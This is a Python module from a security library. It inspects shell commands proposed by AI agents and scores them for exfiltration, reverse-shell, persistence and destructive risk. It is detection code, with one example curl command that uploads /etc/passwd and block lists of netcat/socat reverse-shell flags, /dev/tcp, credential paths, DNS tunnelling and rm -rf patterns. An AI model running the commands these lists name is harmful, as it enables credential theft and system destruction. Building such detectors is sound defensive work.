"""Detection-only inspection of proposed shell commands and egress channels.

Why this module exists
----------------------
:mod:`sensitiveguard.runtime.command` is the *authorization* boundary: it
accepts a named host capability plus a structured ``argv`` array, resolves it
against an exact grammar, and denies everything else.  It is default-deny and
it never parses a shell string.

Real agents, however, keep *proposing* shell strings: a CodeAgent writes
``os.system(...)``, a model returns ``curl -X POST https://... -d @/etc/passwd``
as a plan step, an MCP server echoes a "suggested command".  Those proposals
have to be inspected, scored and logged before they are refused, so that an
operator can see *what was attempted* rather than only that something was
denied.

This module provides that inspection layer.  It answers one question:

    "If this command string were executed, would data leave the host, and
    would it carry sensitive material?"

Boundaries, stated plainly
--------------------------
* This is a **blocklist**.  Blocklists are evadable; a determined attacker can
  obfuscate around any finite rule set.  It is therefore a *detection and
  telemetry* control, never the thing that makes execution safe.
* The control that actually makes execution safe stays
  :class:`~sensitiveguard.runtime.command.CommandAuthorizer` — an allowlist of
  host-defined capabilities with an exact argument grammar, executed by a
  host-injected sandboxed executor.
* Nothing here executes, resolves, or connects to anything.  The inspector is
  pure string analysis; it does not import :mod:`subprocess` and never touches
  the network or the filesystem.

Use it to alert, to explain a denial, and to enrich audit records.  Do not use
it as the sole gate in front of a real shell.
"""

from __future__ import annotations

import re
import shlex
import unicodedata
from collections.abc import Iterable, Sequence
from dataclasses import dataclass
from typing import Any

from sensitiveguard.models import Severity


_SEVERITY_RANK: dict[Severity, int] = {
    Severity.LOW: 0,
    Severity.MEDIUM: 1,
    Severity.HIGH: 2,
    Severity.CRITICAL: 3,
}

# Categories are stable identifiers; hosts route alerts on them.
CATEGORY_EGRESS = "EGRESS_CHANNEL"
CATEGORY_SENSITIVE_SOURCE = "SENSITIVE_SOURCE"
CATEGORY_STAGING = "EXFIL_STAGING"
CATEGORY_OBFUSCATION = "OBFUSCATION"
CATEGORY_SHELL_CONTROL = "SHELL_CONTROL"
CATEGORY_PRIVILEGE = "PRIVILEGE"
CATEGORY_PERSISTENCE = "PERSISTENCE"
CATEGORY_DESTRUCTIVE = "DESTRUCTIVE"

VERDICT_ALLOW = "ALLOW"
VERDICT_REVIEW = "REVIEW"
VERDICT_BLOCK = "BLOCK"

# Executables whose entire purpose is to move bytes across a network boundary.
_ALWAYS_NETWORK_BINARIES: frozenset[str] = frozenset(
    {
        "bitsadmin",
        "curl",
        "ftp",
        "http",
        "httpie",
        "lftp",
        "nc",
        "ncat",
        "ncftp",
        "netcat",
        "rsync",
        "scp",
        "sftp",
        "socat",
        "ssh",
        "telnet",
        "tftp",
        "wget",
        "wscat",
    }
)

# Executables that reach the network only for specific subcommands or when an
# argument names a remote target.
_CONDITIONAL_NETWORK_BINARIES: frozenset[str] = frozenset(
    {
        "apt",
        "apt-get",
        "as",
        "az",
        "aws",
        "certutil",
        "docker",
        "gcloud",
        "gh",
        "git",
        "gsutil",
        "helm",
        "kubectl",
        "mail",
        "mailx",
        "msmtp",
        "mutt",
        "npm",
        "pip",
        "pip3",
        "podman",
        "rclone",
        "sendmail",
        "ssh-copy-id",
        "yum",
    }
)

_REMOTE_SUBCOMMANDS: frozenset[str] = frozenset(
    {
        "clone",
        "cp",
        "fetch",
        "publish",
        "pull",
        "push",
        "rsync",
        "send",
        "sync",
        "upload",
    }
)

_INTERPRETERS: frozenset[str] = frozenset({"deno", "node", "perl", "php", "python", "python2", "python3", "ruby"})

_INLINE_FLAGS: frozenset[str] = frozenset({"-c", "-e", "-E", "--eval", "--exec"})

# Network APIs that make an inline interpreter snippet an egress channel.
_INLINE_NETWORK_MARKERS: tuple[str, ...] = (
    "boto3",
    "fetch(",
    "ftplib",
    "http.client",
    "httpclient",
    "httplib",
    "io::socket",
    "lwp",
    "net::http",
    "net/http",
    "paramiko",
    "requests.",
    "smtplib",
    "socket.",
    "urllib",
    "urlopen",
    "xmlhttprequest",
)

_URL_SCHEMES: tuple[str, ...] = (
    "ftp://",
    "git://",
    "gopher://",
    "http://",
    "https://",
    "ldap://",
    "smb://",
    "ssh://",
    "tcp://",
    "telnet://",
    "udp://",
)

_SHELL_OPERATORS: tuple[str, ...] = ("&&", "||", ">>", "<<", "|", ";", "&", ">", "<")


# Paths whose contents are credentials or identity material.
_SENSITIVE_PATH_MARKERS: tuple[str, ...] = (
    "/.aws/credentials",
    "/.bash_history",
    "/.docker/config.json",
    "/.git-credentials",
    "/.gnupg",
    "/.kube/config",
    "/.netrc",
    "/.npmrc",
    "/.pypirc",
    "/.ssh",
    "/etc/gshadow",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "authorized_keys",
    "id_dsa",
    "id_ecdsa",
    "id_ed25519",
    "id_rsa",
    "kubeconfig",
    "shadow.bak",
    "wallet.dat",
)

_SENSITIVE_PATH_SUFFIXES: tuple[str, ...] = (
    ".jks",
    ".key",
    ".keystore",
    ".keytab",
    ".p12",
    ".pem",
    ".pfx",
)

_ENV_DUMP_BINARIES: frozenset[str] = frozenset({"env", "printenv"})

_ENCODING_BINARIES: frozenset[str] = frozenset(
    {"base32", "base64", "gpg", "gzip", "openssl", "tar", "uuencode", "xxd", "xz", "zip"}
)

_SHELL_LAUNCHERS: frozenset[str] = frozenset({"ash", "bash", "dash", "fish", "ksh", "sh", "zsh"})

_PRIVILEGE_BINARIES: frozenset[str] = frozenset({"doas", "pkexec", "su", "sudo"})

# Wrappers that run another program; the wrapped program is the real target.
_PREFIX_RUNNERS: frozenset[str] = frozenset(
    {"doas", "env", "nice", "nohup", "setsid", "stdbuf", "sudo", "time", "timeout", "xargs"}
)

_PERSISTENCE_BINARIES: frozenset[str] = frozenset({"at", "crontab", "launchctl", "systemctl"})

_PERSISTENCE_PATH_MARKERS: tuple[str, ...] = (
    "/etc/cron",
    "/etc/rc.local",
    "/etc/systemd/system",
    "/.bash_profile",
    "/.bashrc",
    "/.profile",
    "/.zshrc",
    "authorized_keys",
)

_DNS_BINARIES: frozenset[str] = frozenset({"dig", "drill", "host", "nslookup", "ping"})

_DESTRUCTIVE_PATTERNS: tuple[tuple[str, str], ...] = (
    (r"\brm\s+-[a-z]*[rf][a-z]*\s+(/|~|\$HOME|/\*)(\s|$)", "递归删除根目录或主目录"),
    (r"\bmkfs(\.[a-z0-9]+)?\b", "格式化文件系统"),
    (r"\bdd\b[^\n]*\bof=/dev/", "直接写入块设备"),
    (r">\s*/dev/(sd|nvme|hd)", "覆写块设备"),
    (r":\(\)\s*\{.*\}\s*;?\s*:", "fork 炸弹"),
    (r"\bshred\b", "不可恢复擦除"),
)

_OBFUSCATION_PATTERNS: tuple[tuple[str, str], ...] = (
    (r"\$\{IFS\}", "使用 ${IFS} 拆分空格以绕过关键字匹配"),
    (r"\bIFS\s*=", "改写 IFS 分隔符"),
    (r"\$'\\x[0-9a-fA-F]{2}", "shell 十六进制转义拼接"),
    (r"\\x[0-9a-fA-F]{2}\\x[0-9a-fA-F]{2}", "连续十六进制转义"),
    (r"\brev\b", "使用 rev 反转字符串还原命令"),
)

_MAX_COMMAND_CHARS = 8192
_EVIDENCE_CHARS = 96


def _split_segments(command: str) -> list[str]:
    """Split on shell operators that sit outside quotes and ``$(...)``.

    A naive ``re.split`` cuts through quoted strings, which shreds an inline
    ``python -c "...;..."`` payload into unparseable fragments and hides the
    network call inside it.  This walker tracks quoting, backslash escapes,
    backticks and command-substitution depth so each segment stays whole.
    """
    segments: list[str] = []
    current: list[str] = []
    single = False
    double = False
    backtick = False
    depth = 0
    index = 0
    length = len(command)
    while index < length:
        character = command[index]
        if character == "\\" and not single:
            current.append(character)
            if index + 1 < length:
                current.append(command[index + 1])
                index += 2
                continue
            index += 1
            continue
        if character == "'" and not double and not backtick:
            single = not single
        elif character == '"' and not single and not backtick:
            double = not double
        elif character == "`" and not single and not double:
            backtick = not backtick
        elif not single and not double and not backtick:
            if character == "$" and index + 1 < length and command[index + 1] == "(":
                depth += 1
                current.append("$(")
                index += 2
                continue
            if character == ")" and depth > 0:
                depth -= 1
            elif depth == 0 and character in ";|&\n":
                segments.append("".join(current))
                current = []
                while index < length and command[index] in ";|&\n":
                    index += 1
                continue
        current.append(character)
        index += 1
    segments.append("".join(current))
    return [segment.strip() for segment in segments if segment.strip()]


def _is_wrapper_operand(token: str) -> bool:
    """True while a token is still an argument of a prefix runner, not a program."""
    if token.startswith("-"):
        return True
    if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", token):
        return True
    return bool(re.fullmatch(r"\d+(?:\.\d+)?[smhd]?", token))


def _severity_max(values: Iterable[Severity]) -> Severity | None:
    ranked = sorted(values, key=lambda item: _SEVERITY_RANK[item])
    return ranked[-1] if ranked else None


def _clip(value: str) -> str:
    """Return a short, control-character-free excerpt safe to log."""
    cleaned = "".join(
        character if unicodedata.category(character) not in {"Cc", "Cf", "Cs"} else "�" for character in value
    )
    if len(cleaned) <= _EVIDENCE_CHARS:
        return cleaned
    return cleaned[: _EVIDENCE_CHARS - 1] + "…"


def _basename(token: str) -> str:
    name = token.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    return name.casefold().removesuffix(".exe")


def _host_of(token: str) -> str:
    lowered = token.casefold()
    for scheme in _URL_SCHEMES:
        if scheme in lowered:
            remainder = lowered.split(scheme, 1)[1]
            return remainder.split("/", 1)[0].split("?", 1)[0].split("@")[-1]
    return ""


@dataclass(frozen=True, slots=True)
class EgressFinding:
    """One reason a proposed command looks like an egress or exfiltration step."""

    rule_id: str
    category: str
    severity: Severity
    summary: str
    evidence: str = ""
    segment_index: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "rule_id": self.rule_id,
            "category": self.category,
            "severity": self.severity.value,
            "summary": self.summary,
            "evidence": self.evidence,
            "segment_index": self.segment_index,
        }


@dataclass(frozen=True, slots=True)
class EgressInspection:
    """The full inspection outcome for one proposed command string."""

    verdict: str
    findings: tuple[EgressFinding, ...] = ()
    data_labels: tuple[str, ...] = ()
    exfiltration_suspected: bool = False
    segment_count: int = 0

    @property
    def severity(self) -> Severity | None:
        return _severity_max(finding.severity for finding in self.findings)

    @property
    def categories(self) -> tuple[str, ...]:
        return tuple(sorted({finding.category for finding in self.findings}))

    def to_dict(self) -> dict[str, Any]:
        severity = self.severity
        return {
            "verdict": self.verdict,
            "severity": severity.value if severity is not None else None,
            "categories": list(self.categories),
            "data_labels": list(self.data_labels),
            "exfiltration_suspected": self.exfiltration_suspected,
            "segment_count": self.segment_count,
            "findings": [finding.to_dict() for finding in self.findings],
        }


class EgressCommandInspector:
    """Score a proposed shell command for outbound-data risk.

    The inspector is deliberately stateless and side-effect free.  Pass a
    detector to also label sensitive values that appear inline in the command
    (an ID number in ``argv`` is itself a disclosure, even before the command
    would run).
    """

    def __init__(
        self,
        *,
        detector: Any | None = None,
        allowed_hosts: Iterable[str] = (),
        extra_network_binaries: Iterable[str] = (),
    ) -> None:
        self._detector = detector
        self.allowed_hosts = frozenset(host.strip().casefold().rstrip(".") for host in allowed_hosts if host.strip())
        self._network_binaries = _ALWAYS_NETWORK_BINARIES | frozenset(
            name.strip().casefold() for name in extra_network_binaries if name.strip()
        )

    def inspect(self, command: str, context: Any | None = None) -> EgressInspection:
        if not isinstance(command, str):
            raise TypeError("EgressCommandInspector.inspect expects a command string")
        raw = command.strip()
        findings: list[EgressFinding] = []
        if not raw:
            return EgressInspection(verdict=VERDICT_ALLOW)
        if len(raw) > _MAX_COMMAND_CHARS:
            findings.append(
                EgressFinding(
                    rule_id="EG-OVERSIZE",
                    category=CATEGORY_OBFUSCATION,
                    severity=Severity.MEDIUM,
                    summary="命令超长，超出可审计长度上限",
                    evidence=f"{len(raw)} chars",
                )
            )
            raw = raw[:_MAX_COMMAND_CHARS]

        normalized = unicodedata.normalize("NFKC", raw)
        lowered = normalized.casefold()

        findings.extend(self._whole_string_findings(normalized, lowered))

        segments = _split_segments(normalized)
        for index, segment in enumerate(segments):
            findings.extend(self._segment_findings(segment, index))

        data_labels = self._detect_labels(normalized, context)

        has_egress = any(finding.category == CATEGORY_EGRESS for finding in findings)
        has_sensitive_source = any(finding.category == CATEGORY_SENSITIVE_SOURCE for finding in findings)
        exfiltration = has_egress and (bool(data_labels) or has_sensitive_source)
        if exfiltration:
            reason = "命令内联了敏感数据" if data_labels else "命令读取了凭据/身份文件"
            findings.append(
                EgressFinding(
                    rule_id="EG-EXFIL-COMBINED",
                    category=CATEGORY_EGRESS,
                    severity=Severity.CRITICAL,
                    summary=f"外发通道与敏感数据同时出现：{reason}，判定为数据外传尝试",
                    evidence=", ".join(data_labels) if data_labels else "sensitive-file-read",
                )
            )

        deduplicated: list[EgressFinding] = []
        seen: set[tuple[str, str, str, int]] = set()
        for finding in findings:
            key = (finding.rule_id, finding.severity.value, finding.evidence, finding.segment_index)
            if key in seen:
                continue
            seen.add(key)
            deduplicated.append(finding)

        ordered = tuple(
            sorted(
                deduplicated,
                key=lambda finding: (-_SEVERITY_RANK[finding.severity], finding.segment_index, finding.rule_id),
            )
        )
        return EgressInspection(
            verdict=self._verdict(ordered),
            findings=ordered,
            data_labels=data_labels,
            exfiltration_suspected=exfiltration,
            segment_count=len(segments),
        )

    # -- rule groups ----------------------------------------------------

    def _whole_string_findings(self, normalized: str, lowered: str) -> list[EgressFinding]:
        findings: list[EgressFinding] = []

        operators = [operator for operator in _SHELL_OPERATORS if operator in normalized]
        if operators:
            findings.append(
                EgressFinding(
                    rule_id="EG-SHELL-CONTROL",
                    category=CATEGORY_SHELL_CONTROL,
                    severity=Severity.MEDIUM,
                    summary="包含管道/重定向/串联控制符，结构化命令接口完全不接受这类输入",
                    evidence=" ".join(operators),
                )
            )

        if "/dev/tcp/" in lowered or "/dev/udp/" in lowered:
            findings.append(
                EgressFinding(
                    rule_id="EG-DEV-SOCKET",
                    category=CATEGORY_EGRESS,
                    severity=Severity.CRITICAL,
                    summary="使用 bash /dev/tcp 伪设备直接建立出网连接",
                    evidence=_clip(normalized[max(0, lowered.find("/dev/")) : lowered.find("/dev/") + 48]),
                )
            )

        if "`" in normalized or "$(" in normalized:
            findings.append(
                EgressFinding(
                    rule_id="EG-COMMAND-SUBSTITUTION",
                    category=CATEGORY_OBFUSCATION,
                    severity=Severity.HIGH,
                    summary="使用命令替换，实际执行内容在静态检查时不可见",
                    evidence="`...`" if "`" in normalized else "$(...)",
                )
            )

        if re.search(r"\|\s*(sudo\s+)?(ba)?sh\b", lowered) or re.search(r"\|\s*(python3?|perl|ruby|node)\b", lowered):
            findings.append(
                EgressFinding(
                    rule_id="EG-PIPE-TO-INTERPRETER",
                    category=CATEGORY_OBFUSCATION,
                    severity=Severity.CRITICAL,
                    summary="将上游输出直接管道给 shell 或解释器执行（下载即执行模式）",
                    evidence="| sh",
                )
            )

        if re.search(r"\beval\b", lowered) or "source /dev/stdin" in lowered:
            findings.append(
                EgressFinding(
                    rule_id="EG-EVAL",
                    category=CATEGORY_OBFUSCATION,
                    severity=Severity.HIGH,
                    summary="动态求值字符串为命令",
                    evidence="eval",
                )
            )

        for pattern, summary in _OBFUSCATION_PATTERNS:
            match = re.search(pattern, normalized)
            if match:
                findings.append(
                    EgressFinding(
                        rule_id="EG-OBFUSCATION",
                        category=CATEGORY_OBFUSCATION,
                        severity=Severity.MEDIUM,
                        summary=summary,
                        evidence=_clip(match.group(0)),
                    )
                )

        for pattern, summary in _DESTRUCTIVE_PATTERNS:
            match = re.search(pattern, normalized, flags=re.IGNORECASE)
            if match:
                findings.append(
                    EgressFinding(
                        rule_id="EG-DESTRUCTIVE",
                        category=CATEGORY_DESTRUCTIVE,
                        severity=Severity.CRITICAL,
                        summary=summary,
                        evidence=_clip(match.group(0)),
                    )
                )

        for marker in _PERSISTENCE_PATH_MARKERS:
            if marker in lowered and re.search(r">>?|tee\b", normalized):
                findings.append(
                    EgressFinding(
                        rule_id="EG-PERSISTENCE-FILE",
                        category=CATEGORY_PERSISTENCE,
                        severity=Severity.HIGH,
                        summary="向启动项/授权密钥文件写入内容，属于持久化落点",
                        evidence=_clip(marker),
                    )
                )
                break

        return findings

    def _segment_findings(self, segment: str, index: int) -> list[EgressFinding]:
        findings: list[EgressFinding] = []
        try:
            tokens = shlex.split(segment, posix=True)
        except ValueError:
            tokens = segment.split()
            findings.append(
                EgressFinding(
                    rule_id="EG-PARSE",
                    category=CATEGORY_OBFUSCATION,
                    severity=Severity.MEDIUM,
                    summary="引号不闭合，命令无法被安全解析（静态审计结果不可信）",
                    evidence=_clip(segment),
                    segment_index=index,
                )
            )
        if not tokens:
            return findings

        # Skip leading environment assignments such as ``FOO=bar curl ...``.
        position = 0
        while position < len(tokens) and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", tokens[position]):
            position += 1
        if position >= len(tokens):
            return findings

        findings.extend(self._argument_findings(tokens[position:], index))

        # ``sudo curl ...`` and ``timeout 5 nc ...`` must be scored on the
        # wrapped program, not on the wrapper that hides it.
        guard = 0
        while position < len(tokens) and guard < 8:
            guard += 1
            executable = _basename(tokens[position])
            arguments = tokens[position + 1 :]
            findings.extend(self._executable_findings(executable, arguments, index))
            if executable not in _PREFIX_RUNNERS or not arguments:
                break
            position += 1
            # Step over the wrapper's own operands (``-n 10``, ``timeout 5``,
            # ``FOO=bar``) until a token that can name a program.
            while position < len(tokens) and _is_wrapper_operand(tokens[position]):
                position += 1
        return findings

    def _executable_findings(self, executable: str, arguments: Sequence[str], index: int) -> list[EgressFinding]:
        findings: list[EgressFinding] = []
        lowered_arguments = [argument.casefold() for argument in arguments]

        if executable in self._network_binaries:
            findings.append(
                EgressFinding(
                    rule_id="EG-NET-BINARY",
                    category=CATEGORY_EGRESS,
                    severity=Severity.CRITICAL,
                    summary=f"调用网络传输程序 {executable}，可直接把本地数据发往外部",
                    evidence=executable,
                    segment_index=index,
                )
            )
            if executable in {"nc", "ncat", "netcat"} and any(
                argument in {"-e", "-c", "--exec", "--sh-exec"} for argument in lowered_arguments
            ):
                findings.append(
                    EgressFinding(
                        rule_id="EG-REVERSE-SHELL",
                        category=CATEGORY_EGRESS,
                        severity=Severity.CRITICAL,
                        summary="netcat 携带 -e/-c，等价于反弹 shell",
                        evidence=f"{executable} -e",
                        segment_index=index,
                    )
                )
            if executable == "socat" and any("exec:" in argument for argument in lowered_arguments):
                findings.append(
                    EgressFinding(
                        rule_id="EG-REVERSE-SHELL",
                        category=CATEGORY_EGRESS,
                        severity=Severity.CRITICAL,
                        summary="socat EXEC: 将进程绑定到网络连接，等价于反弹 shell",
                        evidence="socat exec:",
                        segment_index=index,
                    )
                )

        elif executable in _CONDITIONAL_NETWORK_BINARIES:
            remote = any(subcommand in _REMOTE_SUBCOMMANDS for subcommand in lowered_arguments[:2]) or any(
                self._looks_remote(argument) for argument in arguments
            )
            findings.append(
                EgressFinding(
                    rule_id="EG-NET-BINARY-CONDITIONAL",
                    category=CATEGORY_EGRESS if remote else CATEGORY_SHELL_CONTROL,
                    severity=Severity.HIGH if remote else Severity.MEDIUM,
                    summary=(
                        f"{executable} 带远端子命令/远端目标，会把内容推送到外部服务"
                        if remote
                        else f"{executable} 具备联网能力，需按用途逐条授权"
                    ),
                    evidence=executable,
                    segment_index=index,
                )
            )

        elif executable in _INTERPRETERS:
            inline = ""
            for position, argument in enumerate(arguments):
                if argument in _INLINE_FLAGS and position + 1 < len(arguments):
                    inline = arguments[position + 1]
                    break
            inline_lowered = inline.casefold()
            if inline and any(marker in inline_lowered for marker in _INLINE_NETWORK_MARKERS):
                findings.append(
                    EgressFinding(
                        rule_id="EG-INLINE-INTERPRETER",
                        category=CATEGORY_EGRESS,
                        severity=Severity.CRITICAL,
                        summary=f"{executable} 内联脚本直接调用网络 API，绕过命令层面的出网检查",
                        evidence=_clip(inline),
                        segment_index=index,
                    )
                )
            elif inline:
                findings.append(
                    EgressFinding(
                        rule_id="EG-INLINE-CODE",
                        category=CATEGORY_OBFUSCATION,
                        severity=Severity.HIGH,
                        summary=f"{executable} 通过 -c/-e 执行内联代码，等价于任意代码执行",
                        evidence=_clip(inline),
                        segment_index=index,
                    )
                )

        elif executable in _SHELL_LAUNCHERS:
            findings.append(
                EgressFinding(
                    rule_id="EG-SHELL-LAUNCHER",
                    category=CATEGORY_OBFUSCATION,
                    severity=Severity.HIGH,
                    summary=f"启动交互/子 shell {executable}，其后续行为不可静态审计",
                    evidence=executable,
                    segment_index=index,
                )
            )

        elif executable in _ENV_DUMP_BINARIES and not arguments:
            findings.append(
                EgressFinding(
                    rule_id="EG-ENV-DUMP",
                    category=CATEGORY_SENSITIVE_SOURCE,
                    severity=Severity.HIGH,
                    summary="导出全部环境变量，通常包含密钥与令牌",
                    evidence=executable,
                    segment_index=index,
                )
            )

        elif executable in _ENCODING_BINARIES:
            findings.append(
                EgressFinding(
                    rule_id="EG-ENCODE-STAGE",
                    category=CATEGORY_STAGING,
                    severity=Severity.MEDIUM,
                    summary=f"使用 {executable} 编码/打包数据，常见于外传前的数据整备",
                    evidence=executable,
                    segment_index=index,
                )
            )

        elif executable in _PRIVILEGE_BINARIES:
            findings.append(
                EgressFinding(
                    rule_id="EG-PRIVILEGE",
                    category=CATEGORY_PRIVILEGE,
                    severity=Severity.HIGH,
                    summary=f"通过 {executable} 提权执行",
                    evidence=executable,
                    segment_index=index,
                )
            )

        elif executable in _PERSISTENCE_BINARIES:
            findings.append(
                EgressFinding(
                    rule_id="EG-PERSISTENCE",
                    category=CATEGORY_PERSISTENCE,
                    severity=Severity.HIGH,
                    summary=f"通过 {executable} 注册计划任务/服务，实现持久化",
                    evidence=executable,
                    segment_index=index,
                )
            )

        elif executable in _DNS_BINARIES:
            suspicious = any(self._looks_like_dns_tunnel(argument) for argument in arguments)
            if not suspicious and any("$(" in argument or "`" in argument for argument in arguments):
                findings.append(
                    EgressFinding(
                        rule_id="EG-DNS-EXFIL",
                        category=CATEGORY_EGRESS,
                        severity=Severity.HIGH,
                        summary=f"{executable} 的查询名由命令替换拼接，符合 DNS 隧道外传特征",
                        evidence="$(...)",
                        segment_index=index,
                    )
                )
            if suspicious:
                findings.append(
                    EgressFinding(
                        rule_id="EG-DNS-EXFIL",
                        category=CATEGORY_EGRESS,
                        severity=Severity.HIGH,
                        summary=f"{executable} 查询的域名带有超长/编码子域，符合 DNS 隧道外传特征",
                        evidence=_clip(
                            next(argument for argument in arguments if self._looks_like_dns_tunnel(argument))
                        ),
                        segment_index=index,
                    )
                )

        return findings

    def _argument_findings(self, tokens: Sequence[str], index: int) -> list[EgressFinding]:
        findings: list[EgressFinding] = []
        seen_rules: set[tuple[str, str]] = set()

        for token in tokens:
            lowered = token.casefold()

            if any(scheme in lowered for scheme in _URL_SCHEMES):
                host = _host_of(token)
                allowlisted = bool(host) and host in self.allowed_hosts
                key = ("EG-URL", host)
                if key not in seen_rules:
                    seen_rules.add(key)
                    findings.append(
                        EgressFinding(
                            rule_id="EG-URL-ALLOWLISTED" if allowlisted else "EG-URL",
                            category=CATEGORY_SHELL_CONTROL if allowlisted else CATEGORY_EGRESS,
                            severity=Severity.LOW if allowlisted else Severity.HIGH,
                            summary=(
                                f"目标主机 {host} 在宿主允许清单内"
                                if allowlisted
                                else f"参数指向外部网络地址 {host or 'unknown'}"
                            ),
                            evidence=_clip(host or token),
                            segment_index=index,
                        )
                    )

            elif self._looks_remote(token):
                key = ("EG-REMOTE-TARGET", lowered)
                if key not in seen_rules:
                    seen_rules.add(key)
                    findings.append(
                        EgressFinding(
                            rule_id="EG-REMOTE-TARGET",
                            category=CATEGORY_EGRESS,
                            severity=Severity.HIGH,
                            summary="参数是 user@host:path 或 host:port 形式的远端目标",
                            evidence=_clip(token),
                            segment_index=index,
                        )
                    )

            if token.startswith("@") and len(token) > 1:
                findings.append(
                    EgressFinding(
                        rule_id="EG-FILE-UPLOAD",
                        category=CATEGORY_STAGING,
                        severity=Severity.HIGH,
                        summary="使用 @file 语法把本地文件内容作为请求体上传",
                        evidence=_clip(token),
                        segment_index=index,
                    )
                )

            marker = self._sensitive_path(lowered)
            if marker:
                key = ("EG-SENSITIVE-PATH", marker)
                if key not in seen_rules:
                    seen_rules.add(key)
                    findings.append(
                        EgressFinding(
                            rule_id="EG-SENSITIVE-PATH",
                            category=CATEGORY_SENSITIVE_SOURCE,
                            severity=Severity.HIGH,
                            summary="访问凭据或身份文件",
                            evidence=_clip(marker),
                            segment_index=index,
                        )
                    )

        return findings

    # -- helpers --------------------------------------------------------

    @staticmethod
    def _sensitive_path(lowered_token: str) -> str:
        for marker in _SENSITIVE_PATH_MARKERS:
            if marker in lowered_token:
                return marker
        for suffix in _SENSITIVE_PATH_SUFFIXES:
            if lowered_token.endswith(suffix):
                return suffix
        return ""

    @staticmethod
    def _looks_remote(token: str) -> bool:
        if token.startswith("-") or "://" in token:
            return False
        if re.fullmatch(r"[A-Za-z0-9._-]+@[A-Za-z0-9.-]+:[^\s]*", token):
            return True
        if re.fullmatch(r"(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}", token):
            return True
        return bool(re.fullmatch(r"s3://[^\s]+|gs://[^\s]+", token.casefold()))

    @staticmethod
    def _looks_like_dns_tunnel(token: str) -> bool:
        if token.startswith("-") or "." not in token:
            return False
        labels = token.split(".")
        return any(len(label) >= 24 and re.fullmatch(r"[A-Za-z0-9+/=_-]+", label) for label in labels)

    def _detect_labels(self, command: str, context: Any | None) -> tuple[str, ...]:
        if self._detector is None:
            return ()
        try:
            detection = self._detector.detect(command, context)
        except Exception:
            return ()
        labels = getattr(detection, "labels", ())
        return tuple(labels)

    @staticmethod
    def _verdict(findings: Sequence[EgressFinding]) -> str:
        severity = _severity_max(finding.severity for finding in findings)
        if severity is None:
            return VERDICT_ALLOW
        if _SEVERITY_RANK[severity] >= _SEVERITY_RANK[Severity.HIGH]:
            return VERDICT_BLOCK
        if severity is Severity.MEDIUM:
            return VERDICT_REVIEW
        return VERDICT_ALLOW


__all__ = [
    "CATEGORY_DESTRUCTIVE",
    "CATEGORY_EGRESS",
    "CATEGORY_OBFUSCATION",
    "CATEGORY_PERSISTENCE",
    "CATEGORY_PRIVILEGE",
    "CATEGORY_SENSITIVE_SOURCE",
    "CATEGORY_SHELL_CONTROL",
    "CATEGORY_STAGING",
    "EgressCommandInspector",
    "EgressFinding",
    "EgressInspection",
    "VERDICT_ALLOW",
    "VERDICT_BLOCK",
    "VERDICT_REVIEW",
]
